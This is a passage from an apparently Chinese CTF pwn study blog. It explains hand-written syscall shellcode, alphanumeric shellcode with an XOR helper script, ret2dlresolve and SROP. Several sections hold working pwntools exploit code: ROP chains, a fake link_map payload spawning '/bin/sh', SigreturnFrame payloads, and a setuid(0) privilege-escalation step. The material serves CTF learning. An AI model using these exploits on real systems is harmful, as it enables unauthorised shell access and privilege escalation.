xffff，同理在一个数被加时，当加的超过范围反而会成为特别小的，0x0001，在做这类题时一定要把握不对那个数进行检查就加或减的地方，在这次加和减中将整数溢出成为需要的那个数\n纯手搓shellcode\nshellcode的本质就是通过syscall的执行调用不同的函数从而实现目的\n对于不同的函数其系统的调用号不同，不同的系统调用号也能调用不同的函数，这个函数的系统调用号储存在rax寄存器中如，要通过syscall调用read，则在执行syscall这个命令之前要满足\nRAX &#x3D; 0RDI &#x3D; 0RSI &#x3D; 要写入的地址RDX &#x3D; 很大的数\n相当于执行了read(RDI,RSI,RDX)，你就可以往RSI这个地方写很多数据，对于不同的函数的系统调用在下面这个中可以查到Linux系统调用表（64位）_系统调用号表-CSDN博客\n再知道相应的函数的系统调用号以后便可以开始写汇编以满足相应的函数调用，如\nmov rax, 0mov rdi, 0mov rsi, 0x88888888mov rdi, 0x100syscall    \n\n当程序能执行以上的指令后便可以调用read函数向0x88888888的地方读取0x100的数据，\n对于写好的汇编指令要注入到程序中必须换为机器码才能注入到程序中，可以通过以下的网站换为机器码\n[Online Assembler and Disassembler (shell-storm.org)](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst= &amp;arch&#x3D;x86-64&amp;as_format&#x3D;inline#assembly)\n\n对于已知机器码要想换为ascll可以通过以下网站实现\nASCII、十六进制、二进制、十进制、Base64转换器 (bchrt.com)\n但是在很多情况下我们要注入的shellcode是有限制的，有的时候只能输入规定的值如大写字母和数字，像这种情况变要将写的shellcode从16进制的数转为为ascll码的值，如在ascll中A代表41，那么当我们向程序输入A，在程序内部便会存放41如果程序在能执行到这时，便回将那个41当成机器码执行，在ascll码中不同的数相对应的汇编可以在以下的网站中找到\nAlphanumeric shellcode - NetSec\n对于限制输入的时候可以通过异或的操作将输入的数转换为需要的数，这里给一个异或的py脚本\ndef xor_operation_case1():    original_num = int(input(&quot;请输入原数（16进制）：&quot;), 16)    xor_num = int(input(&quot;请输入要对原数进行异或的数（16进制）：&quot;), 16)        result = original_num ^ xor_num        print(&quot;异或的结果：&quot;, hex(result))    print(&quot;原数的二进制表示：&quot;, bin(original_num))    print(&quot;对原数进行异或的数的二进制表示：&quot;, bin(xor_num))    print(&quot;异或的结果的二进制表示：&quot;, bin(result))    print(&#x27;\\n&#x27;)def xor_operation_case2():    original_num = int(input(&quot;请输入原数（16进制）：&quot;), 16)    xor_result = int(input(&quot;请输入异或的结果（16进制）：&quot;), 16)        xor_num = original_num ^ xor_result        print(&quot;对原数进行异或的数：&quot;, hex(xor_num))    print(&quot;原数的二进制表示：&quot;, bin(original_num))    print(&quot;对原数进行异或的数的二进制表示：&quot;, bin(xor_num))    print(&quot;异或的结果的二进制表示：&quot;, bin(xor_result))    print(&#x27;\\n&#x27;)while True:    choice = input(&quot;请选择操作：\\n1. 知道原数和要对原数进行异或的数求异或的结果；\\n2. 知道异或的结果和原数求要对原数进行异或的数（输入1或2）；\\n输入 &#x27;exit&#x27; 退出：\\n&quot;)    if choice == &#x27;1&#x27;:        xor_operation_case1()    elif choice == &#x27;2&#x27;:        xor_operation_case2()    elif choice.lower() == &#x27;exit&#x27;:        print(&quot;程序已退出。&quot;)        break    else:        print(&quot;无效的选择。&quot;)\n\n\n\n\n\nret2dlresolve类题\n关于这类题目现将一般做题方法写下来，具体的原理等看看视频在回来补\n须知道read函数的plt和got的地址\neof = ELF(&#x27;./pwn&#x27;)read_plt = eof.plt[&#x27;read&#x27;]read_got = eof.got[&#x27;read&#x27;]\n\nplt表的头地址和这个地址+7或其它的数\nbss段的空地址，这个空地址可能需要两个\nrdi和rsi寄存器的修改地(如果只修改rsi的没有同时修改rsi和r15的也行，r15一直被修改为0就行)\nplt0=0x401020plt_load =p64(plt0+7)bss=0x404040    bss_stage =bss + 0x100pop_rdi_ret=0x88888888    pop_rsi_ret=0x88888888\n\n还需知道在基本库中函数system和read的地址以及他们两个的差值\nlibc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;)system_libc=libc.sym[&#x27;system&#x27;]    read_libc=libc.sym[&#x27;read&#x27;]l_addr =libc.sym[&#x27;system&#x27;] -libc.sym[&#x27;read&#x27;]\n\n在此之后便可以开始构建其中最重要的基本过程，可以通过以下函数直接构成\n其中的第一个需要输入的参数fake_linkmap_add，便是之前找的bss段的空地址，但最好用第二，第一个需要在之后用于存放这一段命令，bss_stage\n第二个参数known_func_ptr，便是已知的程序中的read函数的got表的地址，read_got\n第三个参数offset，便是库函数中system和read的地址以及他们两个的差值，l_addr\ndef fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):\tlinkmap = p64(offset &amp; (2 ** 64 - 1))#l_addr\tlinkmap += p64(0)\tlinkmap += p64(fake_linkmap_addr + 0x18)\tlinkmap += p64((fake_linkmap_addr + 0x30 - offset) &amp; (2 ** 64 - 1))\tlinkmap += p64(0x7)\tlinkmap += p64(0)\tlinkmap += p64(0)\tlinkmap += p64(0)\tlinkmap += p64(known_func_ptr - 0x8)\tlinkmap += b&#x27;/bin/sh\\x00&#x27;\tlinkmap = linkmap.ljust(0x68,b&#x27;A&#x27;)\tlinkmap += p64(fake_linkmap_addr)\tlinkmap += p64(fake_linkmap_addr + 0x38)\tlinkmap = linkmap.ljust(0xf8,b&#x27;A&#x27;)\tlinkmap += p64(fake_linkmap_addr + 0x8)\treturn linkmap\n\n现在便可以开始构建基本payload，和必要过程\nfake_link_map = fake_Linkmap_payload(bss_stage, read_got ,l_addr)    payload = flat( b&#x27;a&#x27;*(栈溢出的垃圾值，rbp+8) ,               pop_rdi, 0 ,pop_rsi ,bss_stage ,read_plt//调用read函数将fake_link_map写入bss\t\t\t    ,pop_rsi ,0 ,pop_rdi ,bss_stage +0x48 ,plt_load ,bss_stage ,0)\n\n之后便可以直接发个程序了\np.sendline(payload)p.send(fake_link_map)p.interactive()\n\n综合\nfrom pwn import *#from LibcSearcher import *context(os = &quot;linux&quot;, arch = &quot;amd64&quot;, log_level= &quot;debug&quot;) p=process(&#x27;./pwn3&#x27;)#p =remote(&#x27;node4.buuoj.cn&#x27;,27108)eof = ELF(&#x27;./pwn3&#x27;)libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;) read_plt = eof.plt[&#x27;read&#x27;]read_got = eof.got[&#x27;read&#x27;]#vuln_addr = 0x401170plt0 = 0x401020 #plt段地址 bss = 0x404040bss_stage =bss + 0x00l_addr =libc.sym[&#x27;system&#x27;] -libc.sym[&#x27;read&#x27;] pop_rdi = 0x000000000040115e    #pop rdi ; retpop_rsi = 0x0000000000401231    #pop rsi ; ret#用于解析符号 dl_runtime_resolve  plt_load =p64(plt0+7) def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):\tlinkmap = p64(offset &amp; (2 ** 64 - 1))#l_addr\tlinkmap += p64(0)\tlinkmap += p64(fake_linkmap_addr + 0x18)\tlinkmap += p64((fake_linkmap_addr + 0x30 - offset) &amp; (2 ** 64 - 1))\tlinkmap += p64(0x7)\tlinkmap += p64(0)\tlinkmap += p64(0)\tlinkmap += p64(0)\tlinkmap += p64(known_func_ptr - 0x8)\tlinkmap += b&#x27;/bin/sh\\x00&#x27;\tlinkmap = linkmap.ljust(0x68,b&#x27;A&#x27;)\tlinkmap += p64(fake_linkmap_addr)\tlinkmap += p64(fake_linkmap_addr + 0x38)\tlinkmap = linkmap.ljust(0xf8,b&#x27;A&#x27;)\tlinkmap += p64(fake_linkmap_addr + 0x8)\treturn linkmap fake_link_map = fake_Linkmap_payload(bss_stage, read_got ,l_addr) payload = flat( b&#x27;a&#x27;*0x78 ,pop_rdi, 0 ,pop_rsi ,bss_stage ,0,read_plt\t\t\t    ,pop_rsi ,0 ,0,pop_rdi ,bss_stage +0x48 ,plt_load ,bss_stage ,0) p.sendline(payload)p.send(fake_link_map)p.interactive()\n\n\n\n\n\nSROP\n对于这种题一般有比较明显的特点，必然有通过syscall进行函数调用的地方而不是直接调用函数，\n对于像这种不用进行栈迁移的，在程序中有syscall函数调用的\n在一开始必须知道得有，rdi寄存器修改，bss段的空地址，plt段的syscall函数地址\npop_rdi_ret=0x88888888bss=0x404040sysacll=0x8888888    \n\n对于srop的基本构造可以直接使用现成的工具构造，\nframe=SigreturnFrame()frame.rdi =59frame.rsi =bss -0x30frame.rdx =0frame.rcx =0frame.rsp =bssframe.rip =syscall//syscall在plt的地址\n\n现在便可以开始构建payload，我们要分两次进行输入\npayload=b&#x27;A&#x27;*(到rbp的距离)+p64(bss)+p64(能进行输入的函数的开始，以便第二段的输入)io.sendlineafter(&#x27;srop!\\n&#x27;,payload)    payload=b&#x27;/bin/sh\\x00&#x27;+b&#x27;A&#x27;*（到rbp的距离）payload+=p64(pop_rdi_ret)+p64(15)+p64(syscall)+flat(frame)//将srop的基本参数输入io.sendline(payload)io.interactive() \n\n\n\n在通过脚本拿到shell后发现flag不能读出来，发现pwn文件有s级权限，便可以可以用setuid函数执行0，从而获得权限读取flag，\nelo=ELF(&#x27;libc.so.6&#x27;)setuid_libc=elo.symbols[&#x27;setuid&#x27;]    setuid=setuid_libc+base_libcpayload=flat(pop_rdi_ret,0,stuid,用于拿到shell的过程)    \n\n\n\n\n","categories":["CTF"],"tags":["pwn"]}]